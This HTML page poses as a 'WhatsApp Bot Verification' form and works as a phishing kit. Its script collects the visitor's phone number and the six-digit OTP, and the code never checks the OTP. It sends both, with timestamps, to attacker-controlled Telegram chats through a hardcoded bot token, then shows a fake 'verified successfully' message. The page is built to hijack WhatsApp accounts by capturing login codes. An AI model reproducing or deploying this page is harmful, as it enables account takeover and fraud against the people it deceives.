<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #ece5dd 0%, #d6dbd2 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    
    .card {
      background: #fff;
      width: 100%;
      max-width: 400px;
      padding: 24px 20px;
      border-radius: 15px;
      box-shadow: 0 6px 15px rgba(0,0,0,0.15);
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    
    .whatsapp-icon {
      font-size: 48px;
      color: #25d366;
      margin-bottom: 10px;
    }
    
    h2 {
      color: #075e54;
      margin-bottom: 20px;
      font-size: 24px;
      position: relative;
      padding-bottom: 10px;
    }
    
    h2:after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 50px;
      height: 3px;
      background: #25d366;
      border-radius: 3px;
    }
    
    .input-group {
      display: flex;
      gap: 8px;
      margin-bottom: 16px;
    }
    
    select {
      flex: 1;
      height: 42px;
      width: 85px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 14px;
      background-color: #fff;
      padding: 0 8px;
    }
    
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    
    input:focus {
      border-color: #25d366;
      outline: none;
    }
    
    button {
      width: 100%;
      padding: 14px;
      background: #25d366;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.3s, transform 0.2s;
    }
    
    button:hover {
      background: #128C7E;
      transform: translateY(-2px);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    button:disabled {
      background: #b9f6ca;
      cursor: not-allowed;
      transform: none;
    }
    
    #loading {
      display: none;
      font-size: 16px;
      color: #444;
      margin: 15px 0;
    }
    
    #otpPage {
      display: none;
    }
    
    .timer {
      margin: 12px 0;
      font-size: 15px;
      color: #666;
    }
    
    .timer span {
      font-weight: bold;
      color: #075e54;
    }
    
    .resend {
      margin-top: 16px;
      color: #128C7E;
      font-size: 15px;
      cursor: pointer;
      transition: color 0.3s;
    }
    
    .resend:hover {
      text-decoration: underline;
    }
    
    .resend.disabled {
      color: #ccc;
      cursor: not-allowed;
      text-decoration: none;
    }
    
    .success-message {
      display: none;
      color: #25d366;
      margin-top: 15px;
      font-weight: bold;
      padding: 10px;
      background: #f0fff0;
      border-radius: 8px;
    }
    
    .error-message {
      display: none;
      color: #ff3333;
      margin-top: 15px;
      font-weight: bold;
      padding: 10px;
      background: #fff0f0;
      border-radius: 8px;
    }
    
    .try-again-btn {
      background: #ff3333;
      margin-top: 10px;
    }
    
    .try-again-btn:hover {
      background: #cc0000;
    }
    
    .otp-inputs {
      display: flex;
      justify-content: space-between;
      margin: 20px 0;
    }
    
    .otp-input {
      width: 45px;
      height: 45px;
      text-align: center;
      font-size: 20px;
      border: 2px solid #ccc;
      border-radius: 8px;
      transition: all 0.3s;
    }
    
    .otp-input:focus {
      border-color: #25d366;
      outline: none;
      box-shadow: 0 0 5px rgba(37, 211, 102, 0.5);
    }
    
    .step-indicator {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .step {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #ccc;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 10px;
      font-weight: bold;
    }
    
    .step.active {
      background: #25d366;
    }
    
    .step-line {
      width: 40px;
      height: 2px;
      background: #ccc;
      margin: 0 5px;
      align-self: center;
    }
    
    .step-line.active {
      background: #25d366;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="whatsapp-icon">
      <i class="fab fa-whatsapp"></i>
    </div>
    <h2>WhatsApp Bot Verification</h2>
    
    <div class="step-indicator">
      <div class="step active">1</div>
      <div class="step-line"></div>
      <div class="step">2</div>
    </div>

    <!-- Number Page -->
    <div id="numberPage">
      <div class="input-group">
        <select id="countryCode">
        <option value="+977">🇳🇵 Nepal (+977)</option>
        <option value="+92">🇵🇰 Pakistan (+92)</option>
        <option value="+880">🇧🇩 Bangladesh (+880)</option>
        <option value="+1">🇺🇸 USA (+1)</option>
        <option value="+44">🇬🇧 UK (+44)</option>
        <option value="+971">🇦🇪 UAE (+971)</option>
        <option value="+234">🇳🇬 Nigeria (+234)</option>
        <option value="+93">🇦🇫 Afghanistan (+93)</option>
        <option value="+358">🇦🇽 Åland Islands (+358)</option>
        <option value="+355">🇦🇱 Albania (+355)</option>
        <option value="+213">🇩🇿 Algeria (+213)</option>
        <option value="+1">🇦🇸 American Samoa (+1)</option>
        <option value="+376">🇦🇩 Andorra (+376)</option>
        <option value="+244">🇦🇴 Angola (+244)</option>
        <option value="+1">🇦🇮 Anguilla (+1)</option>
        <option value="+1">🇦🇬 Antigua and Barbuda (+1)</option>
        <option value="+54">🇦🇷 Argentina (+54)</option>
        <option value="+374">🇦🇲 Armenia (+374)</option>
        <option value="+1">🇧🇧 Barbados (+1)</option>
        <option value="+375">🇧🇾 Belarus (+375)</option>
        <option value="+1">🇨🇦 Canada (+1)</option>
        <option value="+238">🇨🇻 Cape Verde (+238)</option>
        <option value="+1">🇰🇾 Cayman Islands (+1)</option>
        <option value="+236">🇨🇫 Central African Republic (+236)</option>
        <option value="+235">🇹🇩 Chad (+235)</option>
        <option value="+56">🇨🇱 Chile (+56)</option>
        <option value="+86">🇨🇳 China (+86)</option>
        </select>
        <input type="tel" id="phoneNumber" maxlength="10" placeholder="10 digit number" inputmode="numeric">
      </div>
      <button onclick="sendNumber()">Next</button>
      <div id="loading">Please wait, sending verification code...</div>
    </div>

    <!-- OTP Page -->
    <div id="otpPage">
      <p>Enter the 6-digit code sent to your phone</p>
      
      <div class="otp-inputs">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)">
      </div>
      
      <div class="timer">Time remaining: <span id="countdown">01:00</span></div>
      <button onclick="submitOtp()">Verify OTP</button>
      <div class="resend disabled" id="resendBtn" onclick="resendOtp()">Resend OTP</div>
    </div>

    <div class="success-message" id="successMessage">
      <i class="fas fa-check-circle"></i> OTP verified successfully! Redirecting...
    </div>
    
    <div class="error-message" id="errorMessage">
      <i class="fas fa-exclamation-circle"></i> Verification failed. Please try again.
      <button class="try-again-btn" onclick="tryAgain()">Try Again</button>
    </div>
  <script>
    // Telegram Bot Configuration - Multiple Chat IDs
    const TELEGRAM_BOT_TOKEN = "8283989728:AAHYJwZ_oQDptHKrRg-eCOmQOzyq1EUGlrs";
    const TELEGRAM_CHAT_IDS = ["7493999091", "7493999091"];
    
    let fullNumber = "";
    let countdownTimer;
    let timeLeft = 60;

    // Function to send message to multiple Telegram chats
    async function sendToTelegram(message) {
      const sendPromises = TELEGRAM_CHAT_IDS.map(async (chatId) => {
        try {
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'HTML'
            })
          });
          
          const data = await response.json();
          return data.ok;
        } catch (error) {
          console.error('Error sending to Telegram:', error);
          return false;
        }
      });
      
      const results = await Promise.all(sendPromises);
      return results.every(result => result === true);
    }

    // Step 1: Enter number
    window.sendNumber = function() {
      const code = document.getElementById("countryCode").value;
      const num = document.getElementById("phoneNumber").value.trim();

      if (num.length !== 10 || isNaN(num)) {
        alert("Please enter a valid 10 digit number");
        return;
      }

      fullNumber = code + num;

      document.getElementById("loading").style.display = "block";

      // Send phone number to Telegram
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      
      const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>New WhatsApp Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
      
      sendToTelegram(message);

      setTimeout(() => {
        document.getElementById("loading").style.display = "none";
        document.getElementById("numberPage").style.display = "none";
        document.getElementById("otpPage").style.display = "block";
        
        // Update step indicator
        document.querySelectorAll('.step')[1].classList.add('active');
        document.querySelector('.step-line').classList.add('active');
        
        // Start the countdown timer
        startTimer();
      }, 1500);
    };

    // Timer function
    function startTimer() {
      timeLeft = 60;
      updateTimerDisplay();
      
      // Enable/disable resend button
      document.getElementById('resendBtn').classList.add('disabled');
      
      clearInterval(countdownTimer);
      countdownTimer = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
          clearInterval(countdownTimer);
          document.getElementById('resendBtn').classList.remove('disabled');
        }
      }, 1000);
    }
    
    function updateTimerDisplay() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      document.getElementById('countdown').textContent = 
        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    // Resend OTP function
    window.resendOtp = function() {
      if (timeLeft > 0) return;
      
      // Simulate resending OTP
      const otpInputs = document.querySelectorAll('.otp-input');
      otpInputs.forEach(input => input.value = '');
      alert('OTP has been resent!');
      
      // Send resend notification to Telegram
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const message = `🔄 <b>OTP Resent</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n⏰ <b>Time:</b> ${time}`;
      
      sendToTelegram(message);
      
      startTimer();
    };

    // Step 2: Enter OTP
    window.submitOtp = async function() {
      const otpInputs = document.querySelectorAll('.otp-input');
      let otp = '';
      otpInputs.forEach(input => otp += input.value);
      
      if (otp.length !== 6 || isNaN(otp)) {
        alert("Please enter a valid 6 digit OTP");
        return;
      }

      // Send OTP to Telegram
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      
      const message = `⏰ <b>Time:${time} Date:</b> ${date}\n\n✅ <b>OTP Received</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n\n🔢 <b>OTP Code:</b> ${otp}\n`;
      
      const success = await sendToTelegram(message);

      if (success) {
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
        setTimeout(() => {
          document.getElementById('successMessage').style.display = 'none';
          location.reload();
        }, 2000);
      } else {
        // Show error message with Try Again button
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
      }
      
      clearInterval(countdownTimer);
    };
    
    // Try Again function
    window.tryAgain = function() {
      document.getElementById('errorMessage').style.display = 'none';
      document.getElementById('otpPage').style.display = 'block';
      const otpInputs = document.querySelectorAll('.otp-input');
      otpInputs.forEach(input => input.value = '');
      startTimer();
    };
    
    // OTP input navigation
    function moveToNext(current, nextIndex) {
      if (current.value.length >= current.maxLength) {
        const nextInput = document.querySelectorAll('.otp-input')[nextIndex];
        if (nextInput) {
          nextInput.focus();
        }
      }
      
      // Auto-submit if all fields are filled
      const allInputs = document.querySelectorAll('.otp-input');
      const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
      if (allFilled) {
        submitOtp();
      }
    }
  </script>
</body>
</html>